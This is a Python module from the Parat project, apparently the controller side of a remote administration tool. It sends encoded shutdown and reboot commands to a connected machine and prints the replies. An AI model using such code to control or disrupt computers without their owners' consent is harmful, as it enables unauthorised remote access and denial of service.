#
# Copyright(c) 2017, micle(@micle_fm - www.micle.ir - mhd.ceh8@gmail)
# Parat project is under the GNU GENERAL PUBLIC LICENSE (GPL) license.
# see the COPYING file for the detailed licence terms
#

from lib.ParatPrint import pprint, gray
from lib.ParatEncrypt import Encode, Decode


class ParatPower:

    def __init__(self, conn, command, colors):

        self.conn    = conn
        self.command = command
        self.colors  = colors


    def start(self):

        if self.command.strip() == "shutdown":

            self.conn.send(Encode(self.command))
            response = Decode(self.conn.recv(4096))
            pprint(response) if self.colors else pprint(gray(response))


        elif self.command.strip() == "reboot":

            self.conn.send(Encode(self.command))
            response = Decode(self.conn.recv(4096))
            pprint(response) if self.colors else pprint(gray(response))
